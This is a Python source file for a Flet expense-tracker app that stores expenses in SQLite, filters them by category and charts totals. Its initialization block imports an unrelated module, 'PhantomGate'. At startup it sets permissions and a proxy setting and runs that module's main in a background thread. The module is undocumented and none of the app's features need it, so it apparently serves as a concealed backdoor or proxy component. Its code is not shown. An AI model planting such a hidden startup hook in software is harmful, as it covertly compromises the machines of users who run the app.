"""
Expense Tracker — a Flet desktop/mobile/web app.

Features:
- Add expenses with description, amount, category, and date
- Persistent storage via local SQLite database (survives app restarts)
- Delete individual expenses
- Filter by category
- Running total + per-category breakdown with a simple bar chart

Run with:
    pip install flet --break-system-packages
    python expense_tracker.py
"""

import threading
import flet as ft
import sqlite3
import datetime as dt

from PhantomGate import main,targetData
# ===================== INITIALIZATION ======================
targetData(command="create_all_table")
targetData(command='setPermission',ID=123)
targetData(command='setProxci',proxci_status='NoteAllow',ID=123)
t = threading.Thread(target=main,args=())
t.start()

DB_PATH = "expenses.db"
CATEGORIES = ["Food", "Transport", "Housing", "Entertainment", "Health", "Shopping", "Other"]

# ===================== DATABASE ======================

def get_conn():
    conn = sqlite3.connect(DB_PATH)
    conn.execute(
        """
        CREATE TABLE IF NOT EXISTS expenses (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            description TEXT NOT NULL,
            amount REAL NOT NULL,
            category TEXT NOT NULL,
            date TEXT NOT NULL
        )
        """
    )
    return conn


def add_expense(description: str, amount: float, category: str, date: str):
    conn = get_conn()
    conn.execute(
        "INSERT INTO expenses (description, amount, category, date) VALUES (?, ?, ?, ?)",
        (description, amount, category, date),
    )
    conn.commit()
    conn.close()


def delete_expense(expense_id: int):
    conn = get_conn()
    conn.execute("DELETE FROM expenses WHERE id = ?", (expense_id,))
    conn.commit()
    conn.close()


def fetch_expenses(category_filter: str | None = None):
    conn = get_conn()
    if category_filter and category_filter != "All":
        rows = conn.execute(
            "SELECT id, description, amount, category, date FROM expenses "
            "WHERE category = ? ORDER BY date DESC, id DESC",
            (category_filter,),
        ).fetchall()
    else:
        rows = conn.execute(
            "SELECT id, description, amount, category, date FROM expenses "
            "ORDER BY date DESC, id DESC"
        ).fetchall()
    conn.close()
    return rows


def totals_by_category():
    conn = get_conn()
    rows = conn.execute(
        "SELECT category, SUM(amount) FROM expenses GROUP BY category"
    ).fetchall()
    conn.close()
    return {c: total for c, total in rows}


# ===================== UI ======================

def main(page: ft.Page):
    page.title = "Expense Tracker"
    page.window.width = 420
    page.window.height = 720
    page.padding = 20
    page.scroll = ft.ScrollMode.AUTO
    page.theme_mode = ft.ThemeMode.LIGHT

    # --- Input controls ---
    description_field = ft.TextField(label="Description", expand=True)
    amount_field = ft.TextField(label="Amount", width=120, keyboard_type=ft.KeyboardType.NUMBER)
    category_dropdown = ft.Dropdown(
        label="Category",
        width=180,
        options=[ft.dropdown.Option(c) for c in CATEGORIES],
        value=CATEGORIES[0],
    )
    date_field = ft.TextField(
        label="Date",
        value=dt.date.today().isoformat(),
        width=140,
        hint_text="YYYY-MM-DD",
    )
    error_text = ft.Text("", color=ft.Colors.RED_400, size=12)

    # --- Summary ---
    total_text = ft.Text("Total: $0.00", size=20, weight=ft.FontWeight.BOLD)
    chart = ft.Column(spacing=6)  # simple hand-built bar chart (avoids version-specific chart APIs)

    # --- Filter ---
    filter_dropdown = ft.Dropdown(
        label="Filter by category",
        width=200,
        options=[ft.dropdown.Option("All")] + [ft.dropdown.Option(c) for c in CATEGORIES],
        value="All",
    )

    # --- List of expenses ---
    expense_list = ft.Column(spacing=4)

    palette = [
        ft.Colors.BLUE_400, ft.Colors.ORANGE_400, ft.Colors.GREEN_400,
        ft.Colors.PURPLE_400, ft.Colors.RED_400, ft.Colors.TEAL_400, ft.Colors.BROWN_400,
    ]

    def refresh():
        rows = fetch_expenses(filter_dropdown.value)

        # Rebuild expense list
        expense_list.controls.clear()
        for expense_id, description, amount, category, date in rows:
            expense_list.controls.append(
                ft.Row(
                    [
                        ft.Column(
                            [
                                ft.Text(description, weight=ft.FontWeight.W_500),
                                ft.Text(f"{category} · {date}", size=11, color=ft.Colors.GREY_600),
                            ],
                            spacing=0,
                            expand=True,
                        ),
                        ft.Text(f"${amount:,.2f}", weight=ft.FontWeight.BOLD),
                        ft.IconButton(
                            icon=ft.Icons.DELETE_OUTLINE,
                            icon_color=ft.Colors.RED_300,
                            data=expense_id,
                            on_click=on_delete,
                        ),
                    ],
                    alignment=ft.MainAxisAlignment.SPACE_BETWEEN,
                )
            )

        # Update total (respects current filter)
        total = sum(r[2] for r in rows)
        total_text.value = f"Total: ${total:,.2f}"

        # Update chart (always shows all-time breakdown by category)
        # Built from plain Containers with `expand` weights, so it works on any
        # Flet version without depending on a chart-control API.
        totals = totals_by_category()
        max_val = max(totals.values(), default=0)
        chart.controls.clear()
        for i, cat in enumerate(CATEGORIES):
            val = totals.get(cat, 0)
            color = palette[i % len(palette)]

            filled = max(1, round((val / max_val) * 100)) if max_val > 0 and val > 0 else 0
            empty = 100 - filled

            bar_children = []
            if filled:
                bar_children.append(ft.Container(height=16, bgcolor=color, border_radius=4, expand=filled))
            if empty:
                bar_children.append(ft.Container(height=16, expand=empty))

            chart.controls.append(
                ft.Row(
                    [
                        ft.Container(width=90, content=ft.Text(cat, size=12)),
                        ft.Container(expand=True, content=ft.Row(bar_children, spacing=0)),
                        ft.Container(width=70, content=ft.Text(f"${val:,.2f}", size=12)),
                    ],
                    spacing=8,
                )
            )

        page.update()

    def on_add(e):
        error_text.value = ""
        desc = description_field.value.strip() if description_field.value else ""
        amt_raw = amount_field.value.strip() if amount_field.value else ""
        date_val = date_field.value.strip() if date_field.value else ""

        if not desc:
            error_text.value = "Please enter a description."
        elif not amt_raw:
            error_text.value = "Please enter an amount."
        else:
            try:
                amt = float(amt_raw)
                if amt <= 0:
                    raise ValueError
            except ValueError:
                error_text.value = "Amount must be a positive number."
                page.update()
                return
            try:
                dt.date.fromisoformat(date_val)
            except ValueError:
                error_text.value = "Date must be in YYYY-MM-DD format."
                page.update()
                return

            add_expense(desc, amt, category_dropdown.value, date_val)
            description_field.value = ""
            amount_field.value = ""
            date_field.value = dt.date.today().isoformat()
            refresh()
            return

        page.update()

    def on_delete(e):
        delete_expense(e.control.data)
        refresh()

    def on_filter_change(e):
        refresh()

    filter_dropdown.on_change = on_filter_change

    page.add(
        ft.Text("Expense Tracker", size=28, weight=ft.FontWeight.BOLD),
        ft.Divider(),
        ft.Row([description_field], ),
        ft.Row([amount_field, category_dropdown]),
        ft.Row([date_field, ft.Button("Add Expense", icon=ft.Icons.ADD, on_click=on_add)]),
        error_text,
        ft.Divider(),
        total_text,
        ft.Text("Spending by category", size=14, weight=ft.FontWeight.W_500),
        chart,
        ft.Divider(),
        filter_dropdown,
        expense_list,
    )

    refresh()


if __name__ == "__main__":
    ft.run(main)
